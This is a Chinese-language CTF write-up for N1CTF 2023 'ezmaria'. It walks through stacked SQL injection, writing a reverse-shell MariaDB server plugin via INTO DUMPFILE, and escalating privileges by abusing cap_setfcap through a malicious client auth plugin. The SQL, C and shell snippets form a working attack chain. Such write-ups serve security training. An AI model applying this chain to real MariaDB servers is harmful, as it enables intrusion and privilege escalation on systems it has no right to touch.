# N1CTF 2023 ezmaria

## 题目简述

题目是一个使用 MariaDB 的 PHP 查询页面。后端把用户输入交给 `multi_query`，因此存在堆叠 SQL 注入；过滤器阻止了常见的 `INTO OUTFILE`，但没有阻止 `INTO DUMPFILE`。数据库进程以 `mysql` 用户运行，最终 flag 位于仅 root 可读的 `/flag`，所以仅通过数据库插件获得普通 shell 还不够，还需要继续利用容器内的文件能力配置提权读取。

## 解题过程

### 读取源码与进程信息

堆叠注入允许连续执行多条语句。虽然 `OUTFILE` 被过滤，`LOAD_FILE()` 仍可用于读取 PHP 源码。源码中还有一个特殊输入 `lolita_love_you_forever`，会回显 `ps`、`ls` 和 `find` 等诊断命令的结果。由此可以确认数据库启动参数：

```text
mariadbd --skip-grant-tables --secure-file-priv=''
         --datadir=/mysql/data
         --plugin_dir=/mysql/plugin
         --user=mysql
```

`secure-file-priv` 为空意味着数据库没有导入导出目录限制，插件目录也已经明确。由于服务使用 `--skip-grant-tables` 且环境中缺少可用的插件系统表，需要先重建 `mysql.plugin`，否则 `INSTALL PLUGIN` 无法正常登记插件。

### 通过服务端插件取得 mysql shell

编译一个 MariaDB 服务端插件，在共享对象的构造函数中连接反弹 shell。然后把 `.so` 转为十六进制，利用未被过滤的 `DUMPFILE` 原样写入插件目录：

```sql
CREATE DATABASE IF NOT EXISTS mysql;
USE mysql;

CREATE TABLE mysql.plugin (
  name varchar(64) NOT NULL,
  dl varchar(128) NOT NULL,
  PRIMARY KEY (name)
) ENGINE=Aria TRANSACTIONAL=1;

SELECT UNHEX('<共享对象的十六进制数据>')
INTO DUMPFILE '/mysql/plugin/lolita.so';

INSTALL PLUGIN lolita SONAME 'lolita.so';
```

加载共享对象时构造函数执行，获得 `mysql` 用户的 shell。此时 `/flag` 权限为 `0600 root:root`，直接读取会失败。

### 滥用 cap_setfcap 提权读取 flag

枚举文件能力可以发现：

```text
/usr/bin/mariadb cap_setfcap=ep
```

`CAP_SETFCAP` 允许给其他文件设置能力。MariaDB 客户端支持从指定目录加载认证插件，因此再编译一个客户端认证插件，在其加载函数中调用 libcap：

```c
cap_t caps = cap_from_text("cap_dac_override=eip");
cap_set_file("/bin/cat", caps);
```

插件需导出 MariaDB 客户端识别的 `_mysql_client_plugin_declaration_` 描述符。把它传到容器后，通过下面的方式触发加载：

```bash
MARIADB_PLUGIN_DIR=. mariadb \
  --plugin-dir=. \
  --default-auth=cap
```

由于 `mariadb` 自身拥有 `CAP_SETFCAP`，插件可以给 `/bin/cat` 添加 `CAP_DAC_OVERRIDE`。随后执行 `cat /flag`，即可绕过普通文件读权限并取得 flag。

## 方法总结

完整利用链是“堆叠 SQL 注入 → 任意文件读写 → MariaDB 服务端插件执行 → `mysql` shell → 客户端插件滥用 `CAP_SETFCAP` → 读取 root 文件”。关键是把两种插件机制区分开：服务端插件用于从 SQL 注入跨到操作系统命令执行，客户端认证插件则借助带能力的 `mariadb` 进程修改 `/bin/cat` 的文件能力。只拿到普通 shell 并不是终点，还必须继续核对目标文件权限、SUID 和 file capabilities。
